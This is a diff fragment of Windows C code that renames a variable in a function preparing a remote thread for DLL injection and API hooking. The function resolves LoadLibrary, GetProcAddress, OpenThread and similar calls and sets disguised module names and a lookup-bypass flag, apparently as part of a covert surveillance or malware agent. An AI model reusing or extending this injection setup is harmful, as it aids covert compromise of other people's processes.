@@ -138,26 +138,26 @@ DWORD HM_HookingThreadSetup(DWORD * pD)
 {	
 	HMODULE hMod;
 
-	HMHookingThreadDataStruct *pHMHookingThreadData = (HMHookingThreadDataStruct *) pD;
+	HMHookingThreadDataStruct *ctx = (HMHookingThreadDataStruct *) pD;
 	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))
 
 	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
-	VALIDPTR(pHMHookingThreadData->pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"))
-	VALIDPTR(pHMHookingThreadData->pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"))
-	VALIDPTR(pHMHookingThreadData->pCommon._FreeLibrary = (FreeLibrary_T) HM_SafeGetProcAddress(hMod, "FreeLibrary"))
-	VALIDPTR(pHMHookingThreadData->pResumeThread = (ResumeThread_T) HM_SafeGetProcAddress(hMod, "ResumeThread"))
-	VALIDPTR(pHMHookingThreadData->pOpenThread = (OpenThread_T) HM_SafeGetProcAddress(hMod, "OpenThread"))
-	VALIDPTR(pHMHookingThreadData->pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep"))
-	VALIDPTR(pHMHookingThreadData->pCloseHandle = (CloseHandle_T) HM_SafeGetProcAddress(hMod, "CloseHandle"))
+	VALIDPTR(ctx->pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"))
+	VALIDPTR(ctx->pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"))
+	VALIDPTR(ctx->pCommon._FreeLibrary = (FreeLibrary_T) HM_SafeGetProcAddress(hMod, "FreeLibrary"))
+	VALIDPTR(ctx->pResumeThread = (ResumeThread_T) HM_SafeGetProcAddress(hMod, "ResumeThread"))
+	VALIDPTR(ctx->pOpenThread = (OpenThread_T) HM_SafeGetProcAddress(hMod, "OpenThread"))
+	VALIDPTR(ctx->pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep"))
+	VALIDPTR(ctx->pCloseHandle = (CloseHandle_T) HM_SafeGetProcAddress(hMod, "CloseHandle"))
 	
 	// Non lo prendiamo dai nomi guessati perche' la shared potrebbe non essere caricata
 	// se stiamo girando in un servizio
-	if (!FindModulePath(pHMHookingThreadData->cDLLHookName, sizeof(pHMHookingThreadData->cDLLHookName)))
+	if (!FindModulePath(ctx->cDLLHookName, sizeof(ctx->cDLLHookName)))
 		return 1;
 
-	sprintf(pHMHookingThreadData->cInBundleHookName, "%s", "PPPFTBBP03");
-	sprintf(pHMHookingThreadData->cInBundleServiceName, "%s", "PPPFTBBP04");
-	pHMHookingThreadData->lookup_bypass = TRUE;
+	sprintf(ctx->cInBundleHookName, "%s", "PPPFTBBP03");
+	sprintf(ctx->cInBundleServiceName, "%s", "PPPFTBBP04");
+	ctx->lookup_bypass = TRUE;
 	return 0;
 }
 					
